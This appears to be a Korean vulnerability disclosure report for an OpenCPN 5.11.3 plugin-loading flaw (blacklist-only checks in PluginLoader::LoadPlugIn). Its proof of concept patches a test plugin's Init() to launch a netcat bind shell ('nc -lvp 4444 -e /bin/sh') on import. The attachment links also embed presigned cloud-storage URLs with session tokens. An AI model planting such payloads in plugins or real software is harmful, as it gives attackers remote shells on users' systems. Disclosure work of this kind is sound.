---
notion_url: https://www.notion.so/04dbe0809830835ea2c801a5a65a41d1
last_synced: 2026-06-12 13:50
tags: [notion-sync]
---

# [KOR] OpenCPN RCE - Code Injection

취약점 제목 : OpenCPN RCE - Code Injection
취약점 요약 : 서명, 경로, 화이트리스트 검증이 없는 동적 라이브러리 링크 파일을 load 함으로써 발생하는 Remote Code Execution
제조사 : Github OpenSource Project
소프트웨어명 : OpenCPN
버전 : 5.11.3
소프트웨어 유형 : ECS (Electronic Chart System)
공격 유형 : Code Injection
영향 : 프로세스 권한의 Remote Code Execution
취약한 파일명 : plugin_loader.cpp
취약한 함수명 : PluginLoader::LoadPlugIn()
취약한 파라미터 : const wxString& plugin_file, PlugInContainer* pic
취약점 발생 환경 : Ubuntu 24.04

Proof Of Concept  : 
Library를 로드하는 과정 중 검증과정이 블랙리스트 기반 검증밖에 없는것을 확인

```c++
// Check if blacklisted, exit if so.
  auto sts =
      m_blacklist->get_status(pic->m_common_name.ToStdString(),
                              pic->m_version_major, pic->m_version_minor);
  if (sts != plug_status::unblocked) {
    wxLogDebug("Refusing to load blacklisted plugin: %s",
               pic->m_common_name.ToStdString().c_str());
    return nullptr;
  }
  auto data = m_blacklist->get_library_data(plugin_file.ToStdString());
  if (!data.name.empty()) {
    wxLogDebug("Refusing to load blacklisted library: %s",
               plugin_file.ToStdString().c_str());
    return nullptr;
  }
  pic->m_plugin_file = plugin_file;
  pic->m_status =
      PluginStatus::Unmanaged;  // Status is updated later, if necessary

  // load the library
  if (pic->m_library.IsLoaded()) pic->m_library.Unload();
  pic->m_library.Load(plugin_file);

  if (!pic->m_library.IsLoaded()) {
    //  Look in the Blacklist, try to match a filename, to give some kind of
    //  message extract the probable plugin name
    wxFileName fn(plugin_file);
    std::string name = fn.GetName().ToStdString();
    auto found = m_blacklist->get_library_data(name);
    if (m_blacklist->mark_unloadable(plugin_file.ToStdString())) {
      wxLogMessage("Ignoring blacklisted plugin %s", name.c_str());
      if (!found.name.empty()) {
        SemanticVersion v(found.major, found.minor);
        LoadError le(LoadError::Type::Unloadable, name, v);
        load_errors.push_back(le);
      } else {
        LoadError le(LoadError::Type::Unloadable, plugin_file.ToStdString());
        load_errors.push_back(le);
      }
    }
    wxLogMessage(wxString("   PluginLoader: Cannot load library: ") +
                 plugin_file);
    return nullptr;
  }
```

깃허브에서 OpenCPN용 TestPlugin 템플릿을 받아와 예시 RCE로 바인드 쉘을 사용
https://github.com/jongough/testplugin_pi.git
`src/testplugin_pi.cpp` 의 `Init()` 최상단에 다음을 추가:

```c++
#include <thread>
#include <chrono>
#include <cstdlib>
+#include <fstream>

int testplugin_pi::Init(void)
{
+    // Init() 호출 확인 로그
+    std::ofstream fs("/home/user/poc_init.log");
+    fs << "Init() 호출됨\n";
+    fs.close();
+
    // … 기존 초기화 로직 …

+    // 5초 후 바인드 셸 실행 (PoC 예시)
+    std::thread([](){
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+        system("/usr/bin/nc.traditional -lvp 4444 -e /bin/sh &");
+    }).detach();


```

빌드 후 OpenCPN 내부에서 Plugin을 Import 하면

![image](_assets/image.png)

nc 명령으로 쉘 접속 가능함을 알수 있습니다.

취약점 기타 (파일 첨부 영상, 보고서 첨부) :

> 📎 첨부(미변환): [POC2.mp4](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/92bdd4ae-35e4-4636-a8a3-fce96cfbfd0f/POC2.mp4?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662IKGWHMJ%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T045016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIG6iAcm8hTS9yeOMJYc3dVBqLGUs4oDBvFdle%2BjyulHbAiEA6AQWUfaMThbo9qniciv2A8Kupisq8AeU8DS8myperxYq%2FwMIDRAAGgw2Mzc0MjMxODM4MDUiDEfSt2zhUF3s9PLKXircA6GGR5Z%2BpX0Q%2FhmlSB1U1MiisPR9LIGy76Wp7lCBZBPY5W3Ioz099EaPp10HBmvzGvygdG25z%2BTXfArdA0oBKLZxLn5q8DQ9WPuaefpLBE%2F9SKmyqRIi8HkYlWoecj5kEgqeRoYiZ%2BNASpvWpp2l86gPmA9uA5H6oEwcxnQVeDzPpeZABgJqQJultFsmbkoSAJQH3Ej1SltXtHkpQJvpvO%2FAT0N7%2BhP8hJyfEWbMKUy8p9A7%2FFP8fhpGmUlmMDAQm9UwHuROT7bNfGkyKbimgH7638EEpayTnMI61wZ9oDf036miWJaVLhe0NKSUYPPKwOe6krGoucthwfTrv88tpSQRCUqtF2IdRmo1Um7Llhufn198SERuFNuh%2BRpZhzwWxG3f0fYG86%2BGISmiRfsa1brRemXUlconfYtbNkM8dK9xbW48Bz9YlJ%2B8fuUZDo7bDcDZM31IXxpe6ufQfNBgz9Rl6%2FY8FaKNRjxWfRYHW0K5ztQ9mbDzmg0hjAoUnTxbKsxOXEm8hr2r911V%2Bxk%2F3daoeyef3Bz%2FA4g27rJQZTPMUfriuYAFdgYezh8uhfdQoHxHg8xRRAgTaQTx0JZBOGNyhFsHkVv8HgfEo13jyWwRebzNm%2BqSuGwLmOJBMMn7rdEGOqUB2jUQNwlmE3U3YJ0Df%2F3dh6Z4wD3fziZxGhpCV44CUEen3tL%2FglxaXfNkVvoya0ougbKsEUnrnNnIGqFugMclYdOiJej2UjES%2FFEdgv3o47wP6LUltAISVGXLVRwY08bcpy0Po2PeAMcPj95tJ8qRiwDTLhxUbN1z%2BrIkhuUsVxziv%2B07x1ABuV8L3%2BoE7Z4OVej1Cke39zbd9yPbDgfwy0RcRgOp&X-Amz-Signature=b0e2d1bf6fdb64c6bcedcd89b81a5e699c39ecd69fd02bceceafb1f2a715924e&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)




> 📎 첨부(미변환): [zdi report2.txt](https://prod-files-secure.s3.us-west-2.amazonaws.com/94a0bc18-384c-4982-9eeb-174bbdc0da9a/f9e232eb-7be1-4217-8bad-eca58c969748/zdi_report2.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4662IKGWHMJ%2F20260612%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260612T045016Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEEQaCXVzLXdlc3QtMiJHMEUCIG6iAcm8hTS9yeOMJYc3dVBqLGUs4oDBvFdle%2BjyulHbAiEA6AQWUfaMThbo9qniciv2A8Kupisq8AeU8DS8myperxYq%2FwMIDRAAGgw2Mzc0MjMxODM4MDUiDEfSt2zhUF3s9PLKXircA6GGR5Z%2BpX0Q%2FhmlSB1U1MiisPR9LIGy76Wp7lCBZBPY5W3Ioz099EaPp10HBmvzGvygdG25z%2BTXfArdA0oBKLZxLn5q8DQ9WPuaefpLBE%2F9SKmyqRIi8HkYlWoecj5kEgqeRoYiZ%2BNASpvWpp2l86gPmA9uA5H6oEwcxnQVeDzPpeZABgJqQJultFsmbkoSAJQH3Ej1SltXtHkpQJvpvO%2FAT0N7%2BhP8hJyfEWbMKUy8p9A7%2FFP8fhpGmUlmMDAQm9UwHuROT7bNfGkyKbimgH7638EEpayTnMI61wZ9oDf036miWJaVLhe0NKSUYPPKwOe6krGoucthwfTrv88tpSQRCUqtF2IdRmo1Um7Llhufn198SERuFNuh%2BRpZhzwWxG3f0fYG86%2BGISmiRfsa1brRemXUlconfYtbNkM8dK9xbW48Bz9YlJ%2B8fuUZDo7bDcDZM31IXxpe6ufQfNBgz9Rl6%2FY8FaKNRjxWfRYHW0K5ztQ9mbDzmg0hjAoUnTxbKsxOXEm8hr2r911V%2Bxk%2F3daoeyef3Bz%2FA4g27rJQZTPMUfriuYAFdgYezh8uhfdQoHxHg8xRRAgTaQTx0JZBOGNyhFsHkVv8HgfEo13jyWwRebzNm%2BqSuGwLmOJBMMn7rdEGOqUB2jUQNwlmE3U3YJ0Df%2F3dh6Z4wD3fziZxGhpCV44CUEen3tL%2FglxaXfNkVvoya0ougbKsEUnrnNnIGqFugMclYdOiJej2UjES%2FFEdgv3o47wP6LUltAISVGXLVRwY08bcpy0Po2PeAMcPj95tJ8qRiwDTLhxUbN1z%2BrIkhuUsVxziv%2B07x1ABuV8L3%2BoE7Z4OVej1Cke39zbd9yPbDgfwy0RcRgOp&X-Amz-Signature=7e17df98099f62a361f5faa2753998155e06a36376aa4bec834f750966b62d2f&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)
